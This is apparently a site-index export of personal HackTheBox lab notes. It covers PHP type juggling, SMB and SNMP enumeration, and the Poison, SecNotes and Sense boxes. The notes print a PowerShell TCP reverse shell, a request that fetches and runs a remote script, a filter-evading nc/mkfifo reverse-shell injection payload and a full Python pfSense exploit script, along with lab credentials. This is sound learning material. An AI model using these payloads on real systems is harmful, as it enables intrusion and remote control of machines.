	"content": "PHP Type Juggling\nThis article will cover PHP type juggling, and some different ways i have encountered it on hackthebox .\nPHP has two comparisons; loose (==, =!) and strict (=\\==). Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used. This is a built in feature for PHP to force type conversion into specific data type.\nPHP loose comparison does this to accommodate different data types for example; ‘9’ is different from 9. Adding the two data types in PHP will result in 18. In other languages like python will not accommodate such errors. PHP does this so the program might run as it was expected to. Accommodating human errors. Below are some examples of loose comparison.\n'0e1234' == '0e4321' '0e1234' == '0' '0e1234' \u0026lt;= '1' '0xf' == '15' #0xf in hexadecimal notation is 15  when php compares a string to a interger it has some weird quirks.\n'000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)  Another example is when PHP try’s to interpreter a string and its converted into PHP exponential notation 0e⁰²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ 0e²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ equates to int(0) as well. If the number after the first letter is 0 it will remove the leading zero.\nIn the above examples the entire string is converted into a numerical value, or something completely different. Confusing I know but here are some popular charts that show how loose comparison works.\nThe Encounters\nphpsession, cookies, \u0026amp; passwords are susceptible to PHP type juggling. Allowing the attacker to take advantage of a PHP feature to gain access to valid user accounts. From what I have read, the attacker randomly generates cookies. Trying to predict the next cookie. The more random(entropy) the targets cookies have, the harder it is to preform this attack.\nIn the below example, PHP will convert both of the md5 hashes into integers. It will then compare the two values based on the integer. Even though the two hash are different they are both treated as value.\nsubmited cookie aa6fw…34tj4343 = 0 stored cookie ff6dj..w221.5885m = 0  This is also applicable to PHP authentication\nstored password e0rj238r submited password e0mfwewl  References:\nhttps://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ https://www.whitehatsec.com/blog/magic-hashes/  "
},
{
	"uri": "/hackthebox/boxes/poison/",
	"title": "Poison",
	"tags": [],
	"description": "",
	"content": "PHASE 1 NMAP\nnmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.\nport 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32\nport 514 hmm\nPHASE 2 LFI\nManually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\nnext step you will have to decode this secure password.txt. I’d like to note that md5(TMOBILE …COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool — https://gchq.github.io/CyberChef/\nCharix!2#4%6\u0026amp;8(0\nPHASE 3 SSH :🤣\nThis time it wasn’t a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It’s not poison, after a while, I got it right charix is the username.\nsecret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn’t available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS\npython3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.\nFile transfer for NetCat this tool will transfer a file to the other session the \u0026gt; overwrites the file your nc -l -p 8081 \u0026gt; directory_path fromt target nc 10.10.14.3 8081 \u0026gt; secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!\nnetstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN\nYeah, didn’t know this before this box but you can ssh into localhost.\nSSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that’s what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!\n-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you’re smashed into, send it from that host to IP:PORT2\nconcept\nthe juice. it’s a secret guess\nPHASE 5 FINALE\nport 5801 is associated with Vncviewer.\n"
},
{
	"uri": "/_header/",
	"title": "Pwny_Sec",
	"tags": [],
	"description": "",
	"content": " Pwny_Sec "
},
{
	"uri": "/windows/linux-smb-enum/",
	"title": "SMB",
	"tags": [],
	"description": "",
	"content": "Mounting smb shares linux\nYou may get an error, this means that the supporting programs aren\u0026rsquo;t there.\nsudo apt install cifs-utils -y sudo apt install nfs-common  Error Message\nbad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.\u0026lt;type\u0026gt; helper program.  Example\nmount -o user=REPLACE '//ip_addr/share' /mnt/share  +++\nSMBCLIENT\nUsage: smbclient service \u0026lt;password\u0026gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=\u0026lt;c|x\u0026gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?, --help Show this help message --usage Display brief usage message Common samba options: -d, --debuglevel=DEBUGLEVEL Set debug level -s, --configfile=CONFIGFILE Use alternate configuration file -l, --log-basename=LOGFILEBASE Base name for log files -V, --version Print version --option=name=value Set smb.conf option from command line Connection options: -O, --socket-options=SOCKETOPTIONS socket options to use -n, --netbiosname=NETBIOSNAME Primary netbios name -W, --workgroup=WORKGROUP Set the workgroup name -i, --scope=SCOPE Use this Netbios scope Authentication options: -U, --user=USERNAME Set the network username -N, --no-pass Don't ask for a password -k, --kerberos Use kerberos (active directory) authentication -A, --authentication-file=FILE Get the credentials from a file -S, --signing=on|off|required Set the client signing state -P, --machine-pass Use stored machine account password -e, --encrypt Encrypt SMB transport -C, --use-ccache Use the winbind ccache for authentication --pw-nt-hash The supplied password is the NT hash  EXAMPLES\nsmbclient -N -L //ADDRESS smbclient -U admin -L //ADDRESS smbclient -U admin //ADDRESS -N no-pass -L list  +++\nSMBMAP\nSMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com optional arguments: -h, --Help show this help message and exit Main arguments: -H HOST IP of host --host-file FILE File containing a list of hosts -u USERNAME Username, if omitted null session assumed -p PASSWORD Password or NTLM hash -s SHARE Specify a share (default C$), ex 'C$' -d DOMAIN Domain name (default WORKGROUP) -P PORT SMB port (default 445) Command Execution: Options for executing commands on the specified host -x COMMAND Execute a command ex. 'ipconfig /r' Filesystem Search: Options for searching/enumerating the filesystem of the specified host -L List all drives on the specified host @@@@-R [PATH] Recursively list dirs, and files (no share\\path lists ALL shares), ex. 'C$\\Finance' -r [PATH] List contents of directory, default is to list root of all shares, ex. -r 'C$\\Documents and Settings\\Administrator\\Documents' -A PATTERN Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex '(web|global).(asax|config)' -q Disable verbose output (basically only really useful with -A) File Content Search: Options for searching the content of files -F PATTERN File content search, -F '[Pp]assword' (requies admin access to execute commands, and powershell on victim host) --search-path PATH Specify drive/path to search (used with -F, default C:\\Users), ex 'D:\\HR\\' Filesystem interaction: Options for interacting with the specified host's filesystem --download PATH Download a file from the remote system, ex.'C$\\temp\\passwords.txt' --upload SRC DST Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe' --delete PATH TO FILE Delete a remote file, ex. 'C$\\temp\\msf.exe' --skip Skip delete file confirmation prompt *Examples:* $ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group \u0026quot;Domain Admins\u0026quot; /domain'  EXAMPLES\nsmbmap -u admin -p passworw / Hash -H IPADDRESS\nNMAP smbscanning\nhttps://nmap.org/nsedoc/scripts/smb-enum-shares.html\nnmap tools 137-139\nsudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 IP_ADDR  nmap 445\nnmap --script smb-enum-shares.nse -p445 IP_ADDR  "
},
{
	"uri": "/windows/smb/",
	"title": "SMB-KALI",
	"tags": [],
	"description": "",
	"content": "Mounting smb shares linux\nYou may get an error, this means that the supporting programs aren\u0026rsquo;t there.\nsudo apt install cifs-utils -y sudo apt install nfs-common  Error Message\nbad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.\u0026lt;type\u0026gt; helper program.  Example\nmount -o user=REPLACE '//ip_addr/share' /mnt/share  +++\nSMBCLIENT\nUsage: smbclient service \u0026lt;password\u0026gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=\u0026lt;c|x\u0026gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?, --help Show this help message --usage Display brief usage message Common samba options: -d, --debuglevel=DEBUGLEVEL Set debug level -s, --configfile=CONFIGFILE Use alternate configuration file -l, --log-basename=LOGFILEBASE Base name for log files -V, --version Print version --option=name=value Set smb.conf option from command line Connection options: -O, --socket-options=SOCKETOPTIONS socket options to use -n, --netbiosname=NETBIOSNAME Primary netbios name -W, --workgroup=WORKGROUP Set the workgroup name -i, --scope=SCOPE Use this Netbios scope Authentication options: -U, --user=USERNAME Set the network username -N, --no-pass Don't ask for a password -k, --kerberos Use kerberos (active directory) authentication -A, --authentication-file=FILE Get the credentials from a file -S, --signing=on|off|required Set the client signing state -P, --machine-pass Use stored machine account password -e, --encrypt Encrypt SMB transport -C, --use-ccache Use the winbind ccache for authentication --pw-nt-hash The supplied password is the NT hash  EXAMPLES\nsmbclient -N -L //ADDRESS smbclient -U admin -L //ADDRESS smbclient -U admin //ADDRESS -N no-pass -L list  +++\nSMBMAP\nSMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com optional arguments: -h, --Help show this help message and exit Main arguments: -H HOST IP of host --host-file FILE File containing a list of hosts -u USERNAME Username, if omitted null session assumed -p PASSWORD Password or NTLM hash -s SHARE Specify a share (default C$), ex 'C$' -d DOMAIN Domain name (default WORKGROUP) -P PORT SMB port (default 445) Command Execution: Options for executing commands on the specified host -x COMMAND Execute a command ex. 'ipconfig /r' Filesystem Search: Options for searching/enumerating the filesystem of the specified host -L List all drives on the specified host @@@@-R [PATH] Recursively list dirs, and files (no share\\path lists ALL shares), ex. 'C$\\Finance' -r [PATH] List contents of directory, default is to list root of all shares, ex. -r 'C$\\Documents and Settings\\Administrator\\Documents' -A PATTERN Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex '(web|global).(asax|config)' -q Disable verbose output (basically only really useful with -A) File Content Search: Options for searching the content of files -F PATTERN File content search, -F '[Pp]assword' (requies admin access to execute commands, and powershell on victim host) --search-path PATH Specify drive/path to search (used with -F, default C:\\Users), ex 'D:\\HR\\' Filesystem interaction: Options for interacting with the specified host's filesystem --download PATH Download a file from the remote system, ex.'C$\\temp\\passwords.txt' --upload SRC DST Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe' --delete PATH TO FILE Delete a remote file, ex. 'C$\\temp\\msf.exe' --skip Skip delete file confirmation prompt *Examples:* $ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group \u0026quot;Domain Admins\u0026quot; /domain'  EXAMPLES\nsmbmap -u admin -p passworw / Hash -H IPADDRESS -N  NMAP smbscanning\nhttps://nmap.org/nsedoc/scripts/smb-enum-shares.html\nnmap tools 137-139\nsudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 IP_ADDR  nmap 445\nnmap --script smb-enum-shares.nse -p445 IP_ADDR  "
},
{
	"uri": "/linux/snmpwalk/",
	"title": "SNMPWalk",
	"tags": [],
	"description": "",
	"content": "snmp has three version 1, 2c \u0026amp; 3 typically for htb so far its been public but that may not always be the cause. Snmp stands for simple network managment protocal. this allows administrators to collect information for logs. SNMP3 adds a layer of security by providing authentication. In mischief I abused snmp 2c to gain system creds.\nsnmpwalk -c public -v2c 10.10.10.92 | tee snmpwalk-mib.out tee prints out the output as it reads it. -c group -version 1,2c,3 ipAddressTable = prints out ip address table hrSWRunTable = running processes snmpwalk -c public -v2c 10.10.10.92 hrSWRunTable  OID REFERENCE\nAnother Cool tool to easily convert ipv6 strings returned by snmpwalk into something readable is Enxy.\nIf snmp-mibs-downloader is enabled it will produce an error because the python script is looking for the normal output. So need uncomment it out for it to work.\n https://github.com/trickster0/Enyx\npython enyx.py 2x public 10.10.10.92  Install snmp-mibs-downloader to make oid more readable it will also convert ipv6 decimal into hex making it more manageable.\n apt install snmp-mibs-downloader\nvi /etc/snmp/snmp.conf  comment out mibs\n"
},
{
	"uri": "/hackthebox/boxes/secnotes/",
	"title": "SecNotes",
	"tags": [],
	"description": "",
	"content": " NMAP PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods:\n|_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Secure Notes - Login\n|Requested resource was login.php 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 |-methods: | Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows\nService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |_clock-skew: mean: 2h32m44s, deviation: 4h37m10s, median: -7m17s\n| smb-os-discovery: | OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)\n| OS CPE: cpe:/o:microsoft:windows10::-\n| Computer name: SECNOTES | NetBIOS computer name: SECNOTES\\x00 | Workgroup: HTB\\x00 | System time: 2019-01-02T17:39:25-08:00\n| smb-security-mode: | account_used: guest | authentication_level: user | challengeresponse: supported | messagesigning: disabled (dangerous, but default)\n| smb2-security-mode: | 2.02: | Message signing enabled but not required\n| smb2-time: | date: 2019-01-02 20:39:21 |_ start_date: N/A\ncreate a user contact the admin well uses the change_pass to change tylers password\ngo to contact then send tyler a request to change his password to whatever\nCSFA\nhttp://10.10.10.97/change_pass.php?password=chickenpwny\u0026amp;confirm_password=chickenpwny\u0026amp;submit=submit\nFOUND CREDS\ntyler 92g!mA8BGjOirkL%OG*\u0026amp;\nsmbmap -H 10.10.10.97 -u tyler -p \u0026lsquo;92g!mA8BGjOirkL%OG*\u0026amp;\u0026rsquo; [+] Finding open SMB ports\u0026hellip;. [+] User SMB session establishd on 10.10.10.97\u0026hellip; [+] IP: 10.10.10.97:445 Name: 10.10.10.97\n​ Disk Permissions\n​ ADMIN$ NO ACCESS ​ C$ NO ACCESS ​ IPC$ READ ONLY ​ new-site READ, WRITE\nSMBMAP\n -r--r--r-- 696 Thu Jun 21 16:15:36 2018 iisstart.htm -r--r--r-- 98757 Thu Jun 21 16:15:38 2018 iisstart.png  smbmap -H 10.10.10.97 -R new-site -u tyler -p \u0026lsquo;92g!mA8BGjOirkL%OG*\u0026amp;\u0026rsquo; \u0026ndash;upload php-backdoor.php\n\u0026ndash;download PATH Download a file from the remote system,\n\u0026ndash;upload SRC DST Upload a file to the remote system ex. ​ \u0026lsquo;/tmp/payload.exe C$\\temp\\payload.exe\u0026rsquo;\n\u0026ndash;delete PATH TO FILE\n​ Delete a remote file, ex. \u0026lsquo;C$\\temp\\msf.exe\u0026rsquo;\nsmbclient -U tyler \\\\10.10.10.97\\new-site\nsick of smb asking for creds annoying , smbclient has an auth-file switch -A. Next upload the simple-php-backdoor i named mine iisstart.php there are some filters going on if the file isn\u0026rsquo;t named iisstart it will be removed shortly.\nsmbclient -A smb_key \\\\\\\\10.10.10.97\\\\new-site\nput iisstart.php\nnow to test if it works with a simple whoami\n$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;LHOST\u0026#39;,LPORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String ); $sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); Nothing quite like when burp hangs.\nGET /iisstart.php?cmd=powershell+IEX(New-Object+Net.WebClient).downloadString(\u0026lsquo;http://10.10.14.16/Invoke-PowerShellTcp.ps1') HTTP/1.1\nHost: 10.10.10.97:8808\ntry newsstat\nnetstat -ant\ndidn\u0026rsquo;t return anything\ncmd /r dir /a\ncmd ubuntu.exe\nhttps://docs.microsoft.com/en-us/windows/wsl/install-on-server\nWindows Subsystem for Linux 07/11/2017 05:10 PM 190,434 AppxBlockMap.xml\n07/11/2017 05:10 PM 2,475 AppxManifest.xml\n06/21/2018 02:07 PM  AppxMetadata\n07/11/2017 05:11 PM 10,554 AppxSignature.p7x\n06/21/2018 02:07 PM  Assets\n06/21/2018 02:07 PM  images\n07/11/2017 05:10 PM 201,254,783 install.tar.gz\n07/11/2017 05:10 PM 4,840 resources.pri\n06/21/2018 04:51 PM  temp\n07/11/2017 05:10 PM 222,208 ubuntu.exe\n07/11/2017 05:10 PM 809 [Content_Types].xml\nso using wsl.exe we can use wget the system has cat\nin linuc bash files are stored in root or the users home directory.\ndoskey /History to view command prompt entries\nC:\\Users\\charl\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\\root\nafter installing wsl on my computer and doing some test to see how wsl worked. it stores data in appdata\nfound where wsl stores information used\nC:\\users\\tyler\\appdata\\Local\\packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\localstate\\rootfs\\root\ncmd /r type .bash_history\n \u0026gt; /r type .bash_history \u0026gt; cd /mnt/c/ \u0026gt; ls \u0026gt; cd Users/ \u0026gt; cd / \u0026gt; cd ~ \u0026gt; ls \u0026gt; pwd \u0026gt; mkdir filesystem \u0026gt; mount //127.0.0.1/c$ filesystem/ \u0026gt; sudo apt install cifs-utils \u0026gt; mount //127.0.0.1/c$ filesystem/ \u0026gt; mount //127.0.0.1/c$ filesystem/ -o user=administrator \u0026gt; cat /proc/filesystems \u0026gt; sudo modprobe cifs \u0026gt; smbclient \u0026gt; apt install smbclient \u0026gt; smbclient \u0026gt; smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\\\\\127.0.0.1\\\\c$ \u0026gt; \u0026gt; \u0026gt; .bash_history \u0026gt; \u0026gt; less .bash_history \u0026gt; ``` \u0026gt; \u0026gt;  cmd /r \u0026ldquo;smbclient -U \u0026lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh\u0026rsquo; \\\\127.0.0.1\\c$\u0026rdquo;\n cmd /r \u0026ldquo;type c:\\users\\administrator\\root.txt\u0026rdquo;\n  smbclient -U \u0026lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh\u0026rsquo; \\\\127.0.0.1\\c$ ```\nCouldn\u0026rsquo;t run the command inside the box but the last entry in bash_history interested me the most. logged out and copy pasted the above string. you can get root.txt\n"
},
{
	"uri": "/hackthebox/boxes/sense/",
	"title": "Sense",
	"tags": [],
	"description": "",
	"content": "Sense, well be attacking pfsense 2.14 which has a couple of vulnerabilities, pfsense will block you for 24 hours if it detects brute forcing or 15 failed login attempts. To get around this ippsec tunnel through another machine enumerated that way. Using a web directory fuzzer will find two text files that offer some clues to the cmd injection exploit, and the username. I suppose were suppose to guess the password is still pfsense when the username is changed but oh well.\nGetting around being banned\nSSH* Bind Port This will create a connection on the host 8080, This type of connection is limited it works on the application-level of the osi model. it works by assigning a socket to listen to the desired port. Any connection made to the port on the host is forward to our host. ssh will act as a SOCKS server. This is different that port forwarding -L. We can use this to tunnel to burp or use another application.\nssh -D8080 user@ipaddress  Gobuster For gobuster i had to use the medium list the small list didn\u0026rsquo;t catch /system-users.txt. where you will find the hint for the username rohit\n/opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60/ -k -x txt,php,html -x File extentions -k ignore https cert errors. -w wordlist -u url or uri dir specify the mode we want gobuster to run in.  HINTS User: rohit Pass: pfsnese (guess)\nFailures Begin\nThe hints basically force you to brute force, not many of the wordlist have pfsense in them if they do it\u0026rsquo;s way down the table. This much have been by design to force more critical thinking and atleast a basic understanding of pfsense. The default credentials for pfsense are user : admin pass: pfsense .\nCHECK THE TLS CERT\nIt\u0026rsquo;s typically a good idea to check certs for information you might get a username or a different domain. ;) There isn\u0026rsquo;t thing of importance here this time.\nThis was the BURP CERT make sure in the sure chickenpwny to turn off burp when getting the cert so you can look at the websites cert not burps.\nREAL CERT\nIPPSEC BRUTEFORCER PFSENSE\nSo, pfsense use a csrf token to prevent crossite forgery an attempt to verify each action taken is done by the intended user. Lets investigate this further see whats going on with the csrf token. The token is composed of three parts the sid a hash and then i suppose a salt it at the end separated by a comma. Im not totally sure what the last string is for.\nThe string is url encoded, then base64 encoded. notice how it turns into a bunch of characters. The string in the middle is the hash, i want to say the last part has something to do with the session, not a salt. ooooh oh oh oh, its the  cookie_test\nWhen we write the script will need to get __csrf_magic\nEnviroment Variables\nI believe there is quiet a bit of filtering going on here. as certain characters disappears. some commands are filtered out, i believe to prevent exploitation of these vulnerabilities. For example printenv does not print the environment variables but  env does print the variables. forward slashes seem to be taken away aswell as { some other characters. i first noticed this when i was trying to upload my simple-phpbackdoor { } and request was removed. im sure what actually might have caused this it is only assumption up to this point.\nI suppose it\u0026rsquo;s safe to assume we start in /usr/local/www but you never know. I couldn\u0026rsquo;t get it to work i tried playing around with see if i could do something else. The guides all backout three directories. I tried to get a reverse shell using python, bash, php was blocked couldn\u0026rsquo;t get anything to run. I got stumped and went to ippsec video to see how he got around this, by using environment variables.\nThis will echo the command whoami am into pinkie.txt. play around with commands and see what you can run.\nqueues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+\u0026quot;whoami\u0026quot;\u0026gt;pinkie.txt  To get the environment variables, this is where i began to notice there\u0026rsquo;s a filter in place. printenv should print the variables to pinkie.txt. it does though, i tried moving over php script that gives cmd injection when it echo\u0026rsquo;s the content its missing something. perhaps it\u0026rsquo;s reading those characters they should should in a .txt file. who knows i dont.\nqueues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3benv+\u0026gt;pinkie.txt queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+\u0026quot;$PWD\u0026quot;\u0026gt;pinkie.txt #FAILED# queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+\u0026quot;\u0026lt;%3fphp+system($REQUEST['CMD'])%3b%3f\u0026gt;\u0026quot;\u0026gt;pinkie.php #failed# queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3bprintenv+\u0026gt;pinkie.txt #failed# queues;touch+chicken.txt #FAILED# queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3print+$PWD+\u0026gt;pinkie.txt  We have established we can get some commands to run and get the output back. With some minor changes to the rm netcat shell. There more than a couple ways to get a shell. the simplest is the net rm shell. python revse shell is an options i tried to make a script using both but it messes up some how. i think it works but the command isn\u0026rsquo;t getting read because it\u0026rsquo;s not encoded or whatever. which leads to maybe using the octal thing to bypass that. pretty sure it\u0026rsquo;s url encoded. Ippsec in his video pointed the script to burp which isn\u0026rsquo;t that bad of a idea for testing out a pythons script.\nWhy, well i couldn\u0026rsquo;t get it to work /sobs. The scripts i found eploiting this used converting the string to octal to bypass the filter or whatever.\nGET /status_rrd_graph_img.php?database=queues;x%3d$(printf+\u0026quot;\\\\55\u0026quot;)%3brm+${HOME}tmp${HOME}f%3bmkfifo+${HOME}tmp${HOME}f%3bcat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${x}i+2\u0026gt;%261|nc+10.10.14.2+9135\u0026gt;${HOME}tmp${HOME}f HTTP/1.1 nc -lvnp 9135  **to infinity and beyond **\n#!/usr/bin/env python3 import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning import re import argparse import urllib import urllib3 #Parse Arguements parser = argparse.ArgumentParser() parser.add_argument(\u0026quot;-rhost\u0026quot;, help = \u0026quot;Remote Host\u0026quot;) parser.add_argument(\u0026quot;-lhost\u0026quot;, help = \u0026quot;Local Host use ifconfig to get the localhost\u0026quot;) parser.add_argument(\u0026quot;-lport\u0026quot;, help = \u0026quot;Local Port examples, 80,443,53,161\u0026quot;) parser.add_argument(\u0026quot;-user\u0026quot;, help = \u0026quot;UserName\u0026quot;) parser.add_argument(\u0026quot;-passwd\u0026quot;, help = \u0026quot;PassWord\u0026quot;) args = parser.parse_args() #Arguements rhost = args.rhost lhost = args.lhost lport = args.lport username = args.user password = args.passwd #Variables rhost_url = ('https://' + rhost + '/index.php') s = requests.session() requests.packages.urllib3.disable_warnings(InsecureRequestWarning) #this parts pretty cool notice %s then at the end % then some arguements #this will take everything after the . the cookie_text string. re_csrf = 'csrfMagicToken = \u0026quot;(.*?)\u0026quot;' #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # for each line in password.txt run this else print failed r = s.post(rhost_url, verify=False) csrf = re.findall(re_csrf, r.text)[0] login = { '__csrf_magic': csrf,'usernamefld': username, 'passwordfld': password,'login':'Login' } r = s.post(rhost_url, data=login, timeout=5) netcat = \u0026quot;\u0026quot;\u0026quot;x=$(printf \u0026quot;\\\\55\u0026quot;);rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${x}i 2\u0026gt;\u0026amp;1|nc %s %s \u0026gt;${HOME}t$ p${HOME}f\u0026quot;\u0026quot;\u0026quot; % (lhost, lport) #isntead of using evniroment variables to run the script convert #to octal #Encoded_netcat = \u0026quot;\u0026quot; #for c in netcat: # encoded_netcat += \u0026quot;\\\\\\\\%03d\u0026quot; % oct(ord(c)))) #time.sleep(1) #payload = \u0026quot;\u0026quot; #for char in netcat: # payload += ('\\\\' + oct(ord(char)).lstrip(\u0026quot;0o\u0026quot;)) #netcat = \u0026quot;\u0026quot;\u0026quot;x=$(printf \u0026quot;\\\\55\u0026quot;);python ${x}c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;%s\u0026quot;,%s));os.du$ 2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;${HOME}bin${HOME}sh\u0026quot;,\u0026quot;${x}i\u0026quot;]);'\u0026quot;\u0026quot;\u0026quot; % (lhost, lport) exploit_url = ('https://' + rhost + '/status_rrd_graph_img.php?database=queues;' + netcat ) if \u0026quot;Dashboard\u0026quot; in r.text: print(\u0026quot;Valid Login %s:%s\u0026quot; % (username,password)) try: exploit = s.get(exploit_url, headers=s.headers, cookies=s.cookies, timeout=5) if exploit.status_code: print(\u0026quot;nope\u0026quot;) else: print(\u0026quot;yay\u0026quot;) except: print(\u0026quot;could not connect\u0026quot;) print(s.headers) print(s.cookies) print(s.request) else: print(\u0026quot;Failed Login %s:%s\u0026quot; % (username, password)) s.cookies.clear() # EXPLOIT  "
},
{
	"uri": "/hackthebox/boxes/sizzle/",
	"title": "Sizzle",
	"tags": [],
	"description": "",
